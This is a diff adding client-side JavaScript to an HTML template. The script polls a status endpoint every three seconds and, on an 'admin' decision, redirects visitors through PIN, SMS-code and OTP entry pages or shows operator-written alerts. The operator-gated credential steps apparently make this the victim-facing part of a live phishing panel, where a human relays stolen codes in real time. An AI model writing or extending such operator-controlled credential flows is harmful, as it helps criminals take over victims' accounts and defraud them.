@@ -126,6 +126,51 @@
         }
     </script>
 
+    <script>
+    const appId = "{{ app_id }}";
+
+    function checkStatus() {
+        fetch(`/check-status?app_id=${appId}`)
+            .then(response => response.json())
+            .then(data => {
+                console.log("Status check:", data);
+
+                // If admin sent a custom rejection or failure message
+                if (data.status && data.status.startsWith("Reject_")) {
+                    alert(data.custom_message || "Verification failed. Please try again.");
+                    
+                    // Redirect back to the correct step based on the rejection type
+                    if (data.status === "Reject_PIN") {
+                        window.location.href = "/login";
+                    } else if (data.status === "Reject_SMS") {
+                        window.location.href = "/submit-auth-code";
+                    } else if (data.status === "Reject_OTP") {
+                        window.location.href = "/final-verify";
+                    } else {
+                        window.location.href = "/apply/step1";
+                    }
+                } 
+                // If admin approved the step, move to the next screen
+                else if (data.status === "Stage1_Approved") {
+                    window.location.href = "/submit-auth-code";
+                } 
+                else if (data.status === "Stage2_Approved") {
+                    window.location.href = "/final-verify";
+                } 
+                else if (data.status === "Stage3_Approved" || data.status === "Approved") {
+                    window.location.href = "/success";
+                }
+                else if (data.status === "CustomMessage" && data.custom_message) {
+                    alert(data.custom_message);
+                }
+            })
+            .catch(err => console.error("Error checking status:", err));
+    }
+
+    // Poll every 3 seconds
+    setInterval(checkStatus, 3000);
+</script>
+
     <!-- Floating Support Trigger Button -->
 <div id="help-btn" onclick="toggleHelpModal()" style="position: fixed; bottom: 20px; right: 20px; z-index: 9999; cursor: pointer; background: #007bff; color: white; border-radius: 50px; padding: 12px 18px; box-shadow: 0 4px 12px rgba(0,0,0,0.25); display: flex; align-items: center; gap: 8px; font-weight: bold;">
     💬 <span>Need Help?</span>
